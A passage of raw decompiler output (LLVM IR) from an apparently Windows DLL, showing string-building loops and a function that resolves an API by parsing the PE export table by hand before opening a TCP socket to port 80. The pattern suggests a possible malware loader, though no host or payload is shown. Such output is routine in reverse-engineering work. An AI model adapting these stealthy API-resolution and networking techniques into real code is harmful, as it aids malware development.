  br label %dec_label_pc_1000cd8e, !insn.addr !7487

dec_label_pc_1000cbe2:                            ; preds = %dec_label_pc_1000c8d1, %dec_label_pc_1000c8d1, %dec_label_pc_1000c8d1, %dec_label_pc_1000c8d1
  %284 = bitcast i32* %stack_var_3052 to i8*
  store i8* %284, i8** %stack_var_-76, align 4, !insn.addr !7488
  %285 = call i8* @lstrcpyA(i8* nonnull %284, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100395c8, i32 0, i32 0)), !insn.addr !7489
  %286 = ptrtoint i32* %stack_var_844 to i32, !insn.addr !7490
  store i32 %286, i32* %edx.6.reg2mem, !insn.addr !7491
  br label %dec_label_pc_1000cc00, !insn.addr !7491

dec_label_pc_1000cc00:                            ; preds = %dec_label_pc_1000cc00, %dec_label_pc_1000cbe2
  %edx.6.reload = load i32, i32* %edx.6.reg2mem
  %287 = inttoptr i32 %edx.6.reload to i8*, !insn.addr !7492
  %288 = load i8, i8* %287, align 1, !insn.addr !7492
  %289 = add i32 %edx.6.reload, 1, !insn.addr !7493
  %290 = icmp eq i8 %288, 0, !insn.addr !7494
  %291 = icmp eq i1 %290, false, !insn.addr !7495
  store i32 %289, i32* %edx.6.reg2mem, !insn.addr !7495
  br i1 %291, label %dec_label_pc_1000cc00, label %dec_label_pc_1000cc07, !insn.addr !7495

dec_label_pc_1000cc07:                            ; preds = %dec_label_pc_1000cc00
  %292 = ptrtoint i32* %stack_var_3043 to i32, !insn.addr !7496
  store i32 %292, i32* %edi.4.reg2mem, !insn.addr !7496
  br label %dec_label_pc_1000cc11, !insn.addr !7496

dec_label_pc_1000cc11:                            ; preds = %dec_label_pc_1000cc11, %dec_label_pc_1000cc07
  %edi.4.reload = load i32, i32* %edi.4.reg2mem
  %293 = add i32 %edi.4.reload, 1, !insn.addr !7497
  %294 = inttoptr i32 %293 to i8*
  %295 = load i8, i8* %294, align 1, !insn.addr !7497
  %296 = icmp eq i8 %295, 0, !insn.addr !7498
  %297 = icmp eq i1 %296, false, !insn.addr !7499
  store i32 %293, i32* %edi.4.reg2mem, !insn.addr !7499
  br i1 %297, label %dec_label_pc_1000cc11, label %dec_label_pc_1000cc19, !insn.addr !7499

dec_label_pc_1000cc19:                            ; preds = %dec_label_pc_1000cc11
  %298 = sub i32 %289, %286, !insn.addr !7500
  %299 = udiv i32 %298, 4, !insn.addr !7501
  %300 = bitcast i32* %stack_var_844 to i8*, !insn.addr !7502
  call void @__asm_rep_movsd_memcpy(i8* %294, i8* nonnull %300, i32 %299), !insn.addr !7502
  %301 = mul i32 %299, %127, !insn.addr !7502
  %302 = add i32 %293, %301, !insn.addr !7502
  %303 = ptrtoint i32* %stack_var_708 to i32, !insn.addr !7503
  %304 = and i32 %298, 3, !insn.addr !7504
  %305 = inttoptr i32 %302 to i8*, !insn.addr !7505
  call void @__asm_rep_movsb_memcpy(i8* %305, i8* %305, i32 %304), !insn.addr !7505
  store i32 %303, i32* %edx.7.reg2mem, !insn.addr !7506
  br label %dec_label_pc_1000cc30, !insn.addr !7506

dec_label_pc_1000cc30:                            ; preds = %dec_label_pc_1000cc30, %dec_label_pc_1000cc19
  %edx.7.reload = load i32, i32* %edx.7.reg2mem
  %306 = inttoptr i32 %edx.7.reload to i8*, !insn.addr !7507
  %307 = load i8, i8* %306, align 1, !insn.addr !7507
  %308 = add i32 %edx.7.reload, 1, !insn.addr !7508
  %309 = icmp eq i8 %307, 0, !insn.addr !7509
  %310 = icmp eq i1 %309, false, !insn.addr !7510
  store i32 %308, i32* %edx.7.reg2mem, !insn.addr !7510
  store i32 %292, i32* %edi.5.reg2mem, !insn.addr !7510
  br i1 %310, label %dec_label_pc_1000cc30, label %dec_label_pc_1000cc41, !insn.addr !7510

dec_label_pc_1000cc41:                            ; preds = %dec_label_pc_1000cc30, %dec_label_pc_1000cc41
  %edi.5.reload = load i32, i32* %edi.5.reg2mem
  %311 = add i32 %edi.5.reload, 1, !insn.addr !7511
  %312 = inttoptr i32 %311 to i8*
  %313 = load i8, i8* %312, align 1, !insn.addr !7511
  %314 = icmp eq i8 %313, 0, !insn.addr !7512
  %315 = icmp eq i1 %314, false, !insn.addr !7513
  store i32 %311, i32* %edi.5.reg2mem, !insn.addr !7513
  br i1 %315, label %dec_label_pc_1000cc41, label %dec_label_pc_1000cc49, !insn.addr !7513

dec_label_pc_1000cc49:                            ; preds = %dec_label_pc_1000cc41
  %316 = sub i32 %308, %303, !insn.addr !7514
  %317 = udiv i32 %316, 4, !insn.addr !7515
  %318 = bitcast i32* %stack_var_708 to i8*, !insn.addr !7516
  call void @__asm_rep_movsd_memcpy(i8* %312, i8* nonnull %318, i32 %317), !insn.addr !7516
  %319 = mul i32 %317, %127, !insn.addr !7516
  %320 = add i32 %311, %319, !insn.addr !7516
  %321 = ptrtoint i32* %stack_var_1268 to i32, !insn.addr !7517
  %322 = and i32 %316, 3, !insn.addr !7518
  %323 = inttoptr i32 %320 to i8*, !insn.addr !7519
  call void @__asm_rep_movsb_memcpy(i8* %323, i8* %323, i32 %322), !insn.addr !7519
  store i32 %321, i32* %edx.8.reg2mem, !insn.addr !7520
  br label %dec_label_pc_1000cc60, !insn.addr !7520

dec_label_pc_1000cc60:                            ; preds = %dec_label_pc_1000cc60, %dec_label_pc_1000cc49
  %edx.8.reload = load i32, i32* %edx.8.reg2mem
  %324 = inttoptr i32 %edx.8.reload to i8*, !insn.addr !7521
  %325 = load i8, i8* %324, align 1, !insn.addr !7521
  %326 = add i32 %edx.8.reload, 1, !insn.addr !7522
  %327 = icmp eq i8 %325, 0, !insn.addr !7523
  %328 = icmp eq i1 %327, false, !insn.addr !7524
  store i32 %326, i32* %edx.8.reg2mem, !insn.addr !7524
  store i32 %292, i32* %edi.6.reg2mem, !insn.addr !7524
  br i1 %328, label %dec_label_pc_1000cc60, label %dec_label_pc_1000cc71, !insn.addr !7524

dec_label_pc_1000cc71:                            ; preds = %dec_label_pc_1000cc60, %dec_label_pc_1000cc71
  %edi.6.reload = load i32, i32* %edi.6.reg2mem
  %329 = add i32 %edi.6.reload, 1, !insn.addr !7525
  %330 = inttoptr i32 %329 to i8*
  %331 = load i8, i8* %330, align 1, !insn.addr !7525
  %332 = icmp eq i8 %331, 0, !insn.addr !7526
  %333 = icmp eq i1 %332, false, !insn.addr !7527
  store i32 %329, i32* %edi.6.reg2mem, !insn.addr !7527
  br i1 %333, label %dec_label_pc_1000cc71, label %dec_label_pc_1000cc79, !insn.addr !7527

dec_label_pc_1000cc79:                            ; preds = %dec_label_pc_1000cc71
  %334 = sub i32 %326, %321, !insn.addr !7528
  %335 = udiv i32 %334, 4, !insn.addr !7529
  %336 = bitcast i32* %stack_var_1268 to i8*, !insn.addr !7530
  call void @__asm_rep_movsd_memcpy(i8* %330, i8* nonnull %336, i32 %335), !insn.addr !7530
  %337 = mul i32 %335, %127, !insn.addr !7530
  %338 = add i32 %329, %337, !insn.addr !7530
  %339 = and i32 %334, 3, !insn.addr !7531
  %340 = inttoptr i32 %338 to i8*, !insn.addr !7532
  call void @__asm_rep_movsb_memcpy(i8* %340, i8* %340, i32 %339), !insn.addr !7532
  %341 = bitcast i32* %stack_var_2644 to i8*
  store i8* %341, i8** %stack_var_-80, align 4, !insn.addr !7533
  %342 = call i32 @lstrlenA(i8* nonnull %341), !insn.addr !7534
  %343 = call i32 @function_1000b0c0(), !insn.addr !7535
  %344 = ptrtoint i32* %stack_var_80 to i32, !insn.addr !7536
  store i32 %344, i32* %edx.9.reg2mem, !insn.addr !7537
  br label %dec_label_pc_1000ccb0, !insn.addr !7537

dec_label_pc_1000ccb0:                            ; preds = %dec_label_pc_1000ccb0, %dec_label_pc_1000cc79
  %edx.9.reload = load i32, i32* %edx.9.reg2mem
  %345 = inttoptr i32 %edx.9.reload to i8*, !insn.addr !7538
  %346 = load i8, i8* %345, align 1, !insn.addr !7538
  %347 = add i32 %edx.9.reload, 1, !insn.addr !7539
  %348 = icmp eq i8 %346, 0, !insn.addr !7540
  %349 = icmp eq i1 %348, false, !insn.addr !7541
  store i32 %347, i32* %edx.9.reg2mem, !insn.addr !7541
  br i1 %349, label %dec_label_pc_1000ccb0, label %dec_label_pc_1000ccb7, !insn.addr !7541

dec_label_pc_1000ccb7:                            ; preds = %dec_label_pc_1000ccb0
  %350 = ptrtoint i32* %stack_var_3039 to i32, !insn.addr !7542
  store i32 %350, i32* %edi.7.reg2mem, !insn.addr !7542
  br label %dec_label_pc_1000ccc1, !insn.addr !7542

dec_label_pc_1000ccc1:                            ; preds = %dec_label_pc_1000ccc1, %dec_label_pc_1000ccb7
  %edi.7.reload = load i32, i32* %edi.7.reg2mem
  %351 = add i32 %edi.7.reload, 1, !insn.addr !7543
  %352 = inttoptr i32 %351 to i8*
  %353 = load i8, i8* %352, align 1, !insn.addr !7543
  %354 = icmp eq i8 %353, 0, !insn.addr !7544
  %355 = icmp eq i1 %354, false, !insn.addr !7545
  store i32 %351, i32* %edi.7.reg2mem, !insn.addr !7545
  br i1 %355, label %dec_label_pc_1000ccc1, label %dec_label_pc_1000ccc9, !insn.addr !7545

dec_label_pc_1000ccc9:                            ; preds = %dec_label_pc_1000ccc1
  %356 = sub i32 %347, %344, !insn.addr !7546
  %357 = udiv i32 %356, 4, !insn.addr !7547
  %358 = bitcast i32* %stack_var_80 to i8*, !insn.addr !7548
  call void @__asm_rep_movsd_memcpy(i8* %352, i8* nonnull %358, i32 %357), !insn.addr !7548
  %359 = mul i32 %357, %127, !insn.addr !7548
  %360 = add i32 %351, %359, !insn.addr !7548
  %361 = and i32 %356, 3, !insn.addr !7549
  %362 = inttoptr i32 %360 to i8*, !insn.addr !7550
  call void @__asm_rep_movsb_memcpy(i8* %362, i8* %362, i32 %361), !insn.addr !7550
  store i32 ptrtoint ([3 x i16]* @global_var_100395c0 to i32), i32* %edx.10.reg2mem, !insn.addr !7551
  br label %dec_label_pc_1000cce0, !insn.addr !7551

dec_label_pc_1000cce0:                            ; preds = %dec_label_pc_1000cce0, %dec_label_pc_1000ccc9
  %edx.10.reload = load i32, i32* %edx.10.reg2mem
  %363 = inttoptr i32 %edx.10.reload to i8*, !insn.addr !7552
  %364 = load i8, i8* %363, align 1, !insn.addr !7552
  %365 = add i32 %edx.10.reload, 1, !insn.addr !7553
  %366 = icmp eq i8 %364, 0, !insn.addr !7554
  %367 = icmp eq i1 %366, false, !insn.addr !7555
  store i32 %365, i32* %edx.10.reg2mem, !insn.addr !7555
  store i32 %350, i32* %edi.8.reg2mem, !insn.addr !7555
  br i1 %367, label %dec_label_pc_1000cce0, label %dec_label_pc_1000ccf1, !insn.addr !7555

dec_label_pc_1000ccf1:                            ; preds = %dec_label_pc_1000cce0, %dec_label_pc_1000ccf1
  %edi.8.reload = load i32, i32* %edi.8.reg2mem
  %368 = add i32 %edi.8.reload, 1, !insn.addr !7556
  %369 = inttoptr i32 %368 to i8*
  %370 = load i8, i8* %369, align 1, !insn.addr !7556
  %371 = icmp eq i8 %370, 0, !insn.addr !7557
  %372 = icmp eq i1 %371, false, !insn.addr !7558
  store i32 %368, i32* %edi.8.reg2mem, !insn.addr !7558
  br i1 %372, label %dec_label_pc_1000ccf1, label %dec_label_pc_1000ccf9, !insn.addr !7558

dec_label_pc_1000ccf9:                            ; preds = %dec_label_pc_1000ccf1
  %373 = sub i32 %365, ptrtoint ([3 x i16]* @global_var_100395c0 to i32), !insn.addr !7559
  %374 = udiv i32 %373, 4, !insn.addr !7560
  call void @__asm_rep_movsd_memcpy(i8* %369, i8* bitcast ([3 x i16]* @global_var_100395c0 to i8*), i32 %374), !insn.addr !7561
  %375 = mul i32 %374, %127, !insn.addr !7561
  %376 = add i32 %368, %375, !insn.addr !7561
  %377 = ptrtoint i32* %stack_var_2640 to i32, !insn.addr !7562
  %378 = and i32 %373, 3, !insn.addr !7563
  %379 = inttoptr i32 %376 to i8*, !insn.addr !7564
  call void @__asm_rep_movsb_memcpy(i8* %379, i8* %379, i32 %378), !insn.addr !7564
  store i32 %377, i32* %edx.11.reg2mem, !insn.addr !7565
  br label %dec_label_pc_1000cd10, !insn.addr !7565

dec_label_pc_1000cd10:                            ; preds = %dec_label_pc_1000cd10, %dec_label_pc_1000ccf9
  %edx.11.reload = load i32, i32* %edx.11.reg2mem
  %380 = inttoptr i32 %edx.11.reload to i8*, !insn.addr !7566
  %381 = load i8, i8* %380, align 1, !insn.addr !7566
  %382 = add i32 %edx.11.reload, 1, !insn.addr !7567
  %383 = icmp eq i8 %381, 0, !insn.addr !7568
  %384 = icmp eq i1 %383, false, !insn.addr !7569
  store i32 %382, i32* %edx.11.reg2mem, !insn.addr !7569
  store i32 %350, i32* %edi.9.reg2mem, !insn.addr !7569
  br i1 %384, label %dec_label_pc_1000cd10, label %dec_label_pc_1000cd21, !insn.addr !7569

dec_label_pc_1000cd21:                            ; preds = %dec_label_pc_1000cd10, %dec_label_pc_1000cd21
  %edi.9.reload = load i32, i32* %edi.9.reg2mem
  %385 = add i32 %edi.9.reload, 1, !insn.addr !7570
  %386 = inttoptr i32 %385 to i8*
  %387 = load i8, i8* %386, align 1, !insn.addr !7570
  %388 = icmp eq i8 %387, 0, !insn.addr !7571
  %389 = icmp eq i1 %388, false, !insn.addr !7572
  store i32 %385, i32* %edi.9.reg2mem, !insn.addr !7572
  br i1 %389, label %dec_label_pc_1000cd21, label %dec_label_pc_1000cd29, !insn.addr !7572

dec_label_pc_1000cd29:                            ; preds = %dec_label_pc_1000cd21
  %390 = sub i32 %382, %377, !insn.addr !7573
  %391 = udiv i32 %390, 4, !insn.addr !7574
  %392 = bitcast i32* %stack_var_2640 to i8*, !insn.addr !7575
  call void @__asm_rep_movsd_memcpy(i8* %386, i8* nonnull %392, i32 %391), !insn.addr !7575
  %393 = mul i32 %391, %127, !insn.addr !7575
  %394 = add i32 %385, %393, !insn.addr !7575
  %395 = and i32 %390, 3, !insn.addr !7576
  %396 = inttoptr i32 %394 to i8*, !insn.addr !7577
  call void @__asm_rep_movsb_memcpy(i8* %396, i8* %396, i32 %395), !insn.addr !7577
  store i32 0, i32* %stack_var_-84, align 4, !insn.addr !7578
  %397 = ptrtoint i32* %stack_var_1240 to i32, !insn.addr !7579
  %398 = ptrtoint i8** %stack_var_-80 to i32, !insn.addr !7580
  %399 = call i32 @function_10009680(i32 %45, i32 25455, i32* nonnull %stack_var_1240, i32 0), !insn.addr !7581
  store i32 %397, i32* %ecx.6.reg2mem, !insn.addr !7582
  store i32 %398, i32* %esp.1.reg2mem, !insn.addr !7582
  br label %dec_label_pc_1000cd8e, !insn.addr !7582

dec_label_pc_1000cd8e:                            ; preds = %dec_label_pc_1000c8d1, %dec_label_pc_1000cd29, %dec_label_pc_1000cb99, %dec_label_pc_1000cb1c, %dec_label_pc_1000cafd, %dec_label_pc_1000caef, %dec_label_pc_1000ca79, %dec_label_pc_1000c9a4, %dec_label_pc_1000c969, %dec_label_pc_1000c90a
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %ecx.6.reload = load i32, i32* %ecx.6.reg2mem
  %400 = add i32 %esp.1.reload, -4, !insn.addr !7583
  %401 = inttoptr i32 %400 to i32*, !insn.addr !7583
  store i32 %ecx.6.reload, i32* %401, align 4, !insn.addr !7583
  %402 = add i32 %esp.1.reload, 16, !insn.addr !7584
  %403 = inttoptr i32 %402 to i32*, !insn.addr !7584
  %404 = load i32, i32* %403, align 4, !insn.addr !7584
  %405 = add i32 %esp.1.reload, -8, !insn.addr !7584
  %406 = inttoptr i32 %405 to i32*, !insn.addr !7584
  store i32 %404, i32* %406, align 4, !insn.addr !7584
  %407 = add i32 %esp.1.reload, -12, !insn.addr !7585
  %408 = inttoptr i32 %407 to i32*, !insn.addr !7585
  store i32 %ecx.6.reload, i32* %408, align 4, !insn.addr !7585
  %409 = call i32 @function_100074a0(i32 ptrtoint (i32* @1 to i32)), !insn.addr !7586
  br label %dec_label_pc_1000cda2, !insn.addr !7587

dec_label_pc_1000cda2:                            ; preds = %dec_label_pc_1000cda2, %dec_label_pc_1000cd8e
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %410 = inttoptr i32 %ebx.0.reload to i8*, !insn.addr !7588
  %411 = load i8, i8* %410, align 1, !insn.addr !7588
  %412 = add i32 %ebx.0.reload, 1, !insn.addr !7589
  %413 = icmp eq i8 %411, 0, !insn.addr !7590
  %414 = icmp eq i1 %413, false, !insn.addr !7591
  store i32 %412, i32* %ebx.0.reg2mem, !insn.addr !7591
  br i1 %414, label %dec_label_pc_1000cda2, label %dec_label_pc_1000cda9, !insn.addr !7591

dec_label_pc_1000cda9:                            ; preds = %dec_label_pc_1000cda2
  %415 = add i32 %esp.1.reload, 3107, !insn.addr !7592
  store i32 %415, i32* %edi.10.reg2mem, !insn.addr !7592
  br label %dec_label_pc_1000cdb3, !insn.addr !7592

dec_label_pc_1000cdb3:                            ; preds = %dec_label_pc_1000cdb3, %dec_label_pc_1000cda9
  %edi.10.reload = load i32, i32* %edi.10.reg2mem
  %416 = add i32 %edi.10.reload, 1, !insn.addr !7593
  %417 = inttoptr i32 %416 to i8*
  %418 = load i8, i8* %417, align 1, !insn.addr !7593
  %419 = icmp eq i8 %418, 0, !insn.addr !7594
  %420 = icmp eq i1 %419, false, !insn.addr !7595
  store i32 %416, i32* %edi.10.reg2mem, !insn.addr !7595
  br i1 %420, label %dec_label_pc_1000cdb3, label %dec_label_pc_1000cdbb, !insn.addr !7595

dec_label_pc_1000cdbb:                            ; preds = %dec_label_pc_1000cdb3
  %421 = sub i32 %412, %0, !insn.addr !7596
  %422 = udiv i32 %421, 4, !insn.addr !7597
  call void @__asm_rep_movsd_memcpy(i8* %417, i8* %126, i32 %422), !insn.addr !7598
  %423 = mul i32 %422, %127, !insn.addr !7598
  %424 = add i32 %416, %423, !insn.addr !7598
  %425 = and i32 %421, 3, !insn.addr !7599
  %426 = inttoptr i32 %424 to i8*, !insn.addr !7600
  call void @__asm_rep_movsb_memcpy(i8* %426, i8* %426, i32 %425), !insn.addr !7600
  store i32 %415, i32* %ecx.7.reg2mem, !insn.addr !7601
  br label %dec_label_pc_1000cdd1, !insn.addr !7601

dec_label_pc_1000cdd1:                            ; preds = %dec_label_pc_1000cdd1, %dec_label_pc_1000cdbb
  %ecx.7.reload = load i32, i32* %ecx.7.reg2mem
  %427 = add i32 %ecx.7.reload, 1, !insn.addr !7602
  %428 = inttoptr i32 %427 to i8*, !insn.addr !7602
  %429 = load i8, i8* %428, align 1, !insn.addr !7602
  %430 = icmp eq i8 %429, 0, !insn.addr !7603
  %431 = icmp eq i1 %430, false, !insn.addr !7604
  store i32 %427, i32* %ecx.7.reg2mem, !insn.addr !7604
  br i1 %431, label %dec_label_pc_1000cdd1, label %dec_label_pc_1000cddb, !insn.addr !7604

dec_label_pc_1000cddb:                            ; preds = %dec_label_pc_1000cdd1
  %432 = add i32 %esp.1.reload, -16, !insn.addr !7605
  %433 = inttoptr i32 %432 to i32*, !insn.addr !7605
  store i32 25455, i32* %433, align 4, !insn.addr !7605
  %434 = inttoptr i32 %427 to i32*, !insn.addr !7606
  store i32 826110502, i32* %434, align 4, !insn.addr !7606
  %435 = add i32 %esp.1.reload, 12, !insn.addr !7607
  %436 = inttoptr i32 %435 to i32*, !insn.addr !7607
  %437 = load i32, i32* %436, align 4, !insn.addr !7607
  %438 = add i32 %esp.1.reload, -20, !insn.addr !7607
  %439 = inttoptr i32 %438 to i32*, !insn.addr !7607
  store i32 %437, i32* %439, align 4, !insn.addr !7607
  %440 = add i32 %ecx.7.reload, 5, !insn.addr !7608
  %441 = inttoptr i32 %440 to i8*, !insn.addr !7608
  store i8 0, i8* %441, align 1, !insn.addr !7608
  %442 = add i32 %esp.1.reload, 8, !insn.addr !7609
  %443 = add i32 %esp.1.reload, -24, !insn.addr !7610
  %444 = inttoptr i32 %443 to i32*, !insn.addr !7610
  store i32 %442, i32* %444, align 4, !insn.addr !7610
  %445 = add i32 %esp.1.reload, 28156, !insn.addr !7611
  %446 = add i32 %esp.1.reload, -28, !insn.addr !7612
  %447 = inttoptr i32 %446 to i32*, !insn.addr !7612
  store i32 %445, i32* %447, align 4, !insn.addr !7612
  %448 = call i32 @function_1000a4e0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i8 ptrtoint (i32* @1 to i8), i32 ptrtoint (i32* @1 to i32)), !insn.addr !7613
  %449 = add i32 %esp.1.reload, 4, !insn.addr !7614
  %450 = inttoptr i32 %449 to i32*, !insn.addr !7614
  %451 = load i32, i32* %450, align 4, !insn.addr !7614
  store i32 %451, i32* %ecx.8.reg2mem, !insn.addr !7615
  br label %dec_label_pc_1000ce20, !insn.addr !7615

dec_label_pc_1000ce20:                            ; preds = %dec_label_pc_1000ce20, %dec_label_pc_1000cddb
  %ecx.8.reload = load i32, i32* %ecx.8.reg2mem
  %452 = inttoptr i32 %ecx.8.reload to i8*, !insn.addr !7616
  %453 = load i8, i8* %452, align 1, !insn.addr !7616
  %454 = add i32 %ecx.8.reload, 1, !insn.addr !7617
  %455 = icmp eq i8 %453, 0, !insn.addr !7618
  %456 = icmp eq i1 %455, false, !insn.addr !7619
  store i32 %454, i32* %ecx.8.reg2mem, !insn.addr !7619
  br i1 %456, label %dec_label_pc_1000ce20, label %dec_label_pc_1000ce27, !insn.addr !7619

dec_label_pc_1000ce27:                            ; preds = %dec_label_pc_1000ce20
  %457 = sub i32 %ecx.8.reload, %451, !insn.addr !7620
  %458 = add i32 %457, -4, !insn.addr !7621
  %459 = icmp ult i32 %458, 2048, !insn.addr !7622
  %460 = icmp eq i1 %459, false, !insn.addr !7623
  br i1 %460, label %dec_label_pc_1000ce61, label %dec_label_pc_1000ce34, !insn.addr !7623

dec_label_pc_1000ce34:                            ; preds = %dec_label_pc_1000ce27
  %461 = load i32, i32* %403, align 4, !insn.addr !7624
  %462 = icmp eq i32 %461, -1, !insn.addr !7624
  %463 = add i32 %esp.1.reload, 3108, !insn.addr !7625
  %464 = add i32 %463, %458, !insn.addr !7625
  %465 = inttoptr i32 %464 to i8*, !insn.addr !7625
  store i8 %453, i8* %465, align 1, !insn.addr !7625
  %466 = icmp eq i1 %462, false, !insn.addr !7626
  br i1 %466, label %dec_label_pc_1000ce4a, label %dec_label_pc_1000ce42, !insn.addr !7626

dec_label_pc_1000ce42:                            ; preds = %dec_label_pc_1000ce34
  store i32 1, i32* %433, align 4, !insn.addr !7627
  call void @ExitProcess(i32 ptrtoint (i32* @1 to i32)), !insn.addr !7628
  unreachable, !insn.addr !7628

dec_label_pc_1000ce4a:                            ; preds = %dec_label_pc_1000ce34
  %467 = call i32 @"@__security_check_cookie@4"(), !insn.addr !7629
  ret i32 %467, !insn.addr !7630

dec_label_pc_1000ce61:                            ; preds = %dec_label_pc_1000c7a4, %dec_label_pc_1000ce27
  %468 = call i32 @___report_rangecheckfailure(), !insn.addr !7631
  %469 = call i32 @__asm_int3(), !insn.addr !7632
  %470 = call i32 @__asm_int3(), !insn.addr !7633
  %471 = call i32 @__asm_int3(), !insn.addr !7634
  %472 = call i32 @__asm_int3(), !insn.addr !7635
  %473 = call i32 @__asm_int3(), !insn.addr !7636
  %474 = call i32 @__asm_int3(), !insn.addr !7637
  %475 = call i32 @__asm_int3(), !insn.addr !7638
  %476 = call i32 @__asm_int3(), !insn.addr !7639
  %477 = call i32 @__asm_int3(), !insn.addr !7640
  %478 = call i32 @__asm_int3(), !insn.addr !7641
  ret i32 %478, !insn.addr !7641
}

define i32 @function_1000ce70() local_unnamed_addr {
dec_label_pc_1000ce70:
  %storemerge.in.reg2mem = alloca i32*, !insn.addr !7642
  %0 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-468 = alloca i32, align 4
  %stack_var_-464 = alloca i32, align 4
  %stack_var_-396 = alloca i16, align 2
  %1 = call i16 @__decompiler_undefined_function_11()
  %stack_var_-380 = alloca i32, align 4
  %stack_var_-116 = alloca i8, align 1
  %2 = bitcast i8* %stack_var_-116 to i32*
  %3 = call i32* @_memset(i32* nonnull %2, i32 0, i32 100), !insn.addr !7643
  %4 = ptrtoint i32* %stack_var_-380 to i32, !insn.addr !7644
  %5 = call i32* @_memset(i32* nonnull %stack_var_-380, i32 0, i32 260), !insn.addr !7645
  %6 = call i32* @GetModuleHandleA(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10039298, i32 0, i32 0)), !insn.addr !7646
  %7 = ptrtoint i32* %6 to i32, !insn.addr !7646
  store i8 76, i8* %stack_var_-116, align 1, !insn.addr !7647
  %8 = add i32 %7, 60, !insn.addr !7648
  %9 = inttoptr i32 %8 to i32*, !insn.addr !7648
  %10 = load i32, i32* %9, align 4, !insn.addr !7648
  %11 = add i32 %7, 120, !insn.addr !7649
  %12 = add i32 %11, %10, !insn.addr !7649
  %13 = inttoptr i32 %12 to i32*, !insn.addr !7649
  %14 = load i32, i32* %13, align 4, !insn.addr !7649
  %15 = add i32 %14, %7, !insn.addr !7650
  %16 = call i32 @function_10009e60(i32 %7, i32* nonnull %2), !insn.addr !7651
  %17 = add i32 %15, 36, !insn.addr !7652
  %18 = inttoptr i32 %17 to i32*, !insn.addr !7652
  %19 = load i32, i32* %18, align 4, !insn.addr !7652
  %20 = mul i32 %16, 2, !insn.addr !7653
  %21 = add i32 %20, %7, !insn.addr !7653
  %22 = add i32 %21, %19, !insn.addr !7654
  %23 = inttoptr i32 %22 to i16*, !insn.addr !7654
  %24 = load i16, i16* %23, align 2, !insn.addr !7654
  %25 = zext i16 %24 to i32, !insn.addr !7654
  %26 = add i32 %15, 28, !insn.addr !7655
  %27 = inttoptr i32 %26 to i32*, !insn.addr !7655
  %28 = load i32, i32* %27, align 4, !insn.addr !7655
  %29 = mul i32 %25, 4, !insn.addr !7656
  %30 = add i32 %28, %7, !insn.addr !7656
  %31 = add i32 %30, %29, !insn.addr !7657
  %32 = inttoptr i32 %31 to i32*, !insn.addr !7657
  %33 = load i32, i32* %32, align 4, !insn.addr !7657
  %34 = add i32 %33, %7, !insn.addr !7658
  store i32 %34, i32* @global_var_1004094c, align 4, !insn.addr !7659
  %35 = call i8* @lstrcpyA(i8* nonnull %stack_var_-116, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100398ac, i32 0, i32 0)), !insn.addr !7660
  %36 = load i8, i8* %stack_var_-116, align 1, !insn.addr !7661
  %37 = add i8 %36, -1, !insn.addr !7661
  store i8 %37, i8* %stack_var_-116, align 1, !insn.addr !7661
  store i32 1597141847, i32* %stack_var_-380, align 4, !insn.addr !7662
  %38 = call i32 @function_10009e60(i32 %4, i32* bitcast ([8 x i8]* @global_var_100398b4 to i32*)), !insn.addr !7663
  %39 = call i32 @socket(i32 2, i32 1, i32 6), !insn.addr !7664
  %40 = icmp eq i32 %39, -1, !insn.addr !7665
  %41 = icmp eq i1 %40, false, !insn.addr !7666
  br i1 %41, label %dec_label_pc_1000cfc6, label %dec_label_pc_1000cfb2, !insn.addr !7666

dec_label_pc_1000cfb2:                            ; preds = %dec_label_pc_1000ce70
  %42 = call i32 @"@__security_check_cookie@4"(), !insn.addr !7667
  ret i32 %42, !insn.addr !7668

dec_label_pc_1000cfc6:                            ; preds = %dec_label_pc_1000ce70
  %43 = call i128 @__asm_xorps(i128 %0, i128 %0), !insn.addr !7669
  %44 = sext i16 %1 to i128, !insn.addr !7670
  call void @__asm_movups(i128 %44, i128 %43), !insn.addr !7670
  %45 = call %hostent* @gethostbyname(i8* bitcast (i32* @1 to i8*)), !insn.addr !7671
  %46 = icmp eq %hostent* %45, null, !insn.addr !7672
  %47 = icmp eq i1 %46, false, !insn.addr !7673
  br i1 %47, label %dec_label_pc_1000cfe4, label %dec_label_pc_1000cfe1, !insn.addr !7673

dec_label_pc_1000cfe1:                            ; preds = %dec_label_pc_1000cfc6
  store i32* %stack_var_-464, i32** %storemerge.in.reg2mem, !insn.addr !7674
  br label %dec_label_pc_1000cff2, !insn.addr !7674

dec_label_pc_1000cfe4:                            ; preds = %dec_label_pc_1000cfc6
  %48 = ptrtoint %hostent* %45 to i32, !insn.addr !7671
  %49 = add i32 %48, 12, !insn.addr !7675
  %50 = inttoptr i32 %49 to i32*, !insn.addr !7675
  %51 = load i32, i32* %50, align 4, !insn.addr !7675
  %52 = inttoptr i32 %51 to i32*, !insn.addr !7676
  %53 = load i32, i32* %52, align 4, !insn.addr !7676
  %54 = inttoptr i32 %53 to i32*, !insn.addr !7677
  %55 = load i32, i32* %54, align 4, !insn.addr !7677
  store i32 %55, i32* %stack_var_-464, align 4, !insn.addr !7677
  %56 = insertvalue %in_addr undef, i32 %55, 0, !insn.addr !7678
  %57 = call i8* @inet_ntoa(%in_addr %56), !insn.addr !7678
  %58 = ptrtoint i8* %57 to i32, !insn.addr !7678
  store i32 %58, i32* %stack_var_-468, align 4, !insn.addr !7679
  store i32* %stack_var_-468, i32** %storemerge.in.reg2mem, !insn.addr !7679
  br label %dec_label_pc_1000cff2, !insn.addr !7679

dec_label_pc_1000cff2:                            ; preds = %dec_label_pc_1000cfe4, %dec_label_pc_1000cfe1
  %storemerge.in.reload = load i32*, i32** %storemerge.in.reg2mem
  %storemerge = ptrtoint i32* %storemerge.in.reload to i32
  %59 = call i32 @inet_addr(i8* bitcast (i32* @1 to i8*)), !insn.addr !7680
  %60 = add i32 %storemerge, -4, !insn.addr !7681
  %61 = inttoptr i32 %60 to i32*, !insn.addr !7681
  store i32 80, i32* %61, align 4, !insn.addr !7681
  store i16 2, i16* %stack_var_-396, align 2, !insn.addr !7682
  %62 = call i16 @htons(i16 2), !insn.addr !7683
  %63 = add i32 %storemerge, -8, !insn.addr !7684
  %64 = inttoptr i32 %63 to i32*, !insn.addr !7684
